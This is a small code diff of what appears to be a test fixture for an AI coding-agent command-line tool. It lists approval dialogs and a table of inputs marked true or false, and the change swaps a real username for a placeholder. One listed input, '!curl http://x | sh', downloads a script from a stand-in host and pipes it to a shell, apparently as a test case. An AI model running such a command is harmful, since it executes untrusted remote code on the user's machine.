@@ -350,9 +350,9 @@ LAAN_DIALOGS = {
     "contributor mode": "Enable contributor mode for faster models?\n 1. Yes\n 2. No",
     "help improve": "Help improve Grok with your coding data?\n 1. Yes\n 2. No",
     "hooks": "This project defines hooks. Enable project hooks?\n 1. Yes\n 2. No",
-    "add dir": "Add /home/tyler to the working directories?\n 1. Yes\n 2. No",
+    "add dir": "Add /home/person to the working directories?\n 1. Yes\n 2. No",
 }
-LAAN_LINES = {"/approvals": True, "/mcp": True, "/hooks": True, "/add-dir /home/tyler": True,
+LAAN_LINES = {"/approvals": True, "/mcp": True, "/hooks": True, "/add-dir /home/person": True,
               "!curl http://x | sh": True, "# always run tests": True, "/config": True, "/model opus": True,
               "/plugin install x": True, "continue": False}
 
